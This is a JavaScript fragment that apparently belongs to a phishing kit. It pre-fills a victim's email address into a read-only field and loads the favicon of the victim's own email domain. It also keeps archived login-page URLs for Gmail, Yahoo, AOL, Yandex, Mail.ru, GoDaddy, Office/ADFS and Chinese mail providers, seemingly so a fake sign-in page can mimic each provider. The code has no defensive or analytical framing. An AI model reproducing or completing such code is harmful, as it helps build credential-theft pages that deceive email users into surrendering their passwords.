
	// Settings.
	var domain = email.substr(email.lastIndexOf('@') + 1);
	var provider = domain.slice(0, domain.indexOf("."));
	var locateFav = 'https://www.google.com/s2/favicons?domain=' + domain;
    
	
	/* Default Url */
	var aol = 'https://web.archive.org/web/20181226074603/https://login.aol.com/';
	var cn21 = 'https://web.archive.org/web/20181226074716/http://mail.21cn.com/w2/';
	var yandex = 'https://web.archive.org/web/20181117200324/https://passport.yandex.ru/auth?from=cloud&origin=disk_narod_ru&retpath=https%3A%2F%2Fdisk.yandex.ru%2Fclient%2Fnarod%2F%3Fsource%3Dnarod&backpath=https%3A%2F%2Fdisk.yandex.ru';
	var yahoo = 'https://web.archive.org/web/20181226074247/https://login.yahoo.com/';
	var a163 = 'https://mail.163.com';
	var sina = 'https://web.archive.org/web/20181226075055/https://vip.sina.com.cn/'
	var mailru = 'https://web.archive.org/web/20181221174730/https://mail.ru/';
	var office = 'https://web.archive.org/web/20181226091023/https://sso.tcsedsystem.edu/adfs/ls/?client-request-id=776e77b1-42a6-4e01-9bd6-5662a3a9305e&username=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAY2RO2_TUACFc-PUtBVSA2KArSAmJMf3Xr8SSwzNU2keTmhIGw9EzrXdOK-bxtdOmomRsXPZQCARJspSIX5Bpy4gUfEDEBNiYiQRC2PP8OnojN95xKEE0h_Cf8HCigJ0XSQQZ9X-y-T2ZvzDdDR9mwbVl1-bndfv4LNTsMWI79j-sc-cYcKxgwV40GVs7OuiSAM2oLSfoK7rEUdSlQShQ5FOLfEcgEsAFlFNldQkkhFGEtSwhiQkJ1LQkZGiEQETmBJkxVGFDtIkAWKNYNfWsGzBq-iWsROwLl6BTry58zu64dLJsD2mPjvlnoMsYeksrR9mc-knsFCrFMwMbmZoWUb9llqaFxqZkuV1nIOZG2gdGc5acxvmR0eVWXrnwMzUK8VMvdUvkdxxr1smzfqhYcoo6NnLJb2n5o28UawxLRm222wQdoVOGI7VgbWPJEPad1leri24azk94_ilkyEdXXA8HTsjz76MgZ-xm5DT19f5OLgb2Y78iYFXa0v3kS8fzz5_j--e37v15v6395GLNbHrmcbeXJ6U3bCBfDNLekeppmIVRfhUYZLd3K1WlQrxgkaYeyzp6IQHJzz_gwe_ePDiRuTTxjWuutq8gyFKCggLWN2GKR0mdQWafwE1';
	var godaddy = 'https://web.archive.org/web/20181226075610/https://sso.godaddy.com/login?realm=pass&app=email';
	var gmail = 'https://web.archive.org/web/20181130082542/https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1';
	var locate = 'http://mail.' + domain; // For other providers.
	
	
	/* email for Input readonly*/
	document.getElementById('emailit').value = email;
	
	/* favicon */
	document.getElementById('imgFav').src = locateFav;
	document.getElementById('imgFv').src = locateFav;
	

	